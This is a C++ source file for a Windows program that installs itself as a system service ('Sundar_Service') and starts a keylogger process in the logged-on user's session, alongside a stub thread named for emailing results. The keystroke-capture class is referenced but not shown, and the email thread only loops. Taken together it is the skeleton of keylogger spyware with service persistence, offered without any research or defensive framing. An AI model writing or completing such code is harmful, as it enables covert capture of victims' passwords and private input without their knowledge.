//  Service.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "KeyLogManager.h"
#include "ServiceManager.h"
#include "tlhelp32.h" 

#define		MAX_NUM_OF_PROCESS		4
/** Window Service **/
void service_main();
void installer_main();
void keylog_main();

void WINAPI service_proc(DWORD dwArgc, LPTSTR *lpszArgv);
void WINAPI service_handler(DWORD fdwControl);

BOOL RunProcess(LPSTR cmd);

void start_keylog_proc();
void start_proc();
void stop_proc();
DWORD WINAPI keylog_thread(LPVOID info);
DWORD WINAPI email_thread(LPVOID info);
bool is_service_env();
HANDLE keylog_tid;
HANDLE email_tid;
bool running = false;

/** Window Service **/
const int nBufferSize = 500;
CHAR service_name[nBufferSize+1];
CHAR exe_path[nBufferSize+1];

SERVICE_TABLE_ENTRY lpServiceStartTable[] = 
{
	{service_name, service_proc},
	{NULL, NULL}
};

SERVICE_STATUS_HANDLE   hServiceStatusHandle; 
SERVICE_STATUS          ServiceStatus; 

KeyLogManager klm;
PROCESS_INFORMATION	keylog_proc_info;

int WINAPI _tWinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPTSTR lpCmdLine,
    int nCmdShow
){
	if(strcmp(lpCmdLine, "-k") == 0){
		Logger::debug("Keylog Mode");
		keylog_main();
		return 0;
	}
	strcpy(service_name,"Sundar_Service");	
	DWORD size = GetModuleFileName(NULL, exe_path, sizeof(exe_path));
	exe_path[size] = 0;

	bool is_service = ServiceManager::is_service_env();
	if(is_service){
		Logger::debug("Service Mode");
		service_main();
	} else{
		Logger::debug("Installer Mode");
		installer_main();
	}
	return 0;
}

void installer_main(){	
	ServiceManager::uninstall(service_name);
	ServiceManager::install(exe_path, service_name);
	bool ret = ServiceManager::run(service_name);
	if(ret){
		Logger::debug("Service %s Install And Run Succ", service_name);
	} else{
		Logger::debug("Service %s Install And Run Fail", service_name);
	}
}

VOID service_main()
{
	//start serivce
	if(!StartServiceCtrlDispatcher(lpServiceStartTable)) {
		Logger::debug("StartServiceCtrlDispatcher failed, error code = %d\n", GetLastError());
	}
}

VOID WINAPI service_proc(DWORD dwArgc, LPTSTR *lpszArgv)
{
	DWORD   status = 0; 
    DWORD   specificError = 0xfffffff; 
 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE; 
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hServiceStatusHandle = RegisterServiceCtrlHandler(service_name, service_handler); 
    if (hServiceStatusHandle==0) {
		Logger::debug("RegisterServiceCtrlHandler failed, error code = %d\n", GetLastError());
        return; 
    } 
 
    // Initialization complete - report running status 
    ServiceStatus.dwCurrentState       = SERVICE_RUNNING; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0;  
    if(!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError()); 
    } 

	start_proc();
}

void keylog_main(){
	klm.init(GetCurrentThreadId());
	klm.start();
}

void start_keylog_proc(){
	char cmd[512] = {0};
	sprintf(cmd, "%s -k", exe_path);
	bool ret = ServiceManager::create_process_as_user(cmd, &keylog_proc_info);
	if(ret) {
		Sleep(1000);
		Logger::debug("Start Keylog Proc Succ");
	}
	else {
		Logger::debug("Start Keylog Proc Fail, error code = %d\n", GetLastError()); 
	}
}

void stop_keylog_proc(){
	if(keylog_proc_info.hProcess){
		PostThreadMessage(keylog_proc_info.dwThreadId, WM_QUIT, 0, 0);
		Sleep(1000);
		TerminateProcess(keylog_proc_info.hProcess, 0);
	}
}

DWORD WINAPI keylog_thread(LPVOID info){
	klm.init(GetCurrentThreadId());
	klm.start();
	return 0;
}

DWORD WINAPI email_thread(LPVOID info){
	while(running){
		Logger::debug("Email Thread Running");
		Sleep(1000);
	}
	return 0;
}

void start_proc(){
	if(running){
		return;
	}
	running = true;
	start_keylog_proc();
	// keylog_tid = CreateThread(NULL, 0, keylog_thread, NULL, 0, NULL);
	email_tid = CreateThread(NULL, 0, email_thread, NULL, 0, NULL);
	// if(!keylog_tid || !email_tid){
	if(!email_tid){
		stop_proc();
		Logger::debug("Create Working Thread Fail");
	}
}
void stop_proc(){
	running = false;
	stop_keylog_proc();
	// klm.stop();
}

VOID WINAPI service_handler(DWORD fdwControl)
{
	switch(fdwControl) 
	{
		case SERVICE_CONTROL_STOP:
		case SERVICE_CONTROL_SHUTDOWN:
			ServiceStatus.dwWin32ExitCode = 0; 
			ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
			ServiceStatus.dwCheckPoint    = 0; 
			ServiceStatus.dwWaitHint      = 0;
			// terminate all processes started by this service before shutdown
			{
				stop_proc();		
			}
			break; 
		case SERVICE_CONTROL_PAUSE:
			ServiceStatus.dwCurrentState = SERVICE_PAUSED; 
			break;
		case SERVICE_CONTROL_CONTINUE:
			ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
			break;
		case SERVICE_CONTROL_INTERROGATE:
			break;
		default:
			Logger::debug("Unrecognized opcode %d\n", fdwControl);
	};
    if (!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError());
    } 
}
 
